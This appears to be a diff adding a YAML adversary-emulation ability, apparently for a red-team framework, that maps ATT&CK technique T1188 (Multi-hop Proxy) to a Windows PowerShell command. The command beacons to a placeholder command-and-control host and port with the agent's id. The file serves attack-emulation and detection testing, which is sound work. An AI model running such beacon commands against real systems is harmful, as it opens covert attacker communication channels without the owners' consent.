@@ -1,0 +1,13 @@
+- id: 79491b07-cedf-4200-850e-9385c2a76ec1
+  name: Multi-hop Proxy
+  description: Ability for Multi-hop Proxy (ATT&CK T1188). Generated from Atomic Red
+    Team procedures; review and test safely before use. [AUTO-INFERRED SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1188
+    name: Multi-hop Proxy
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
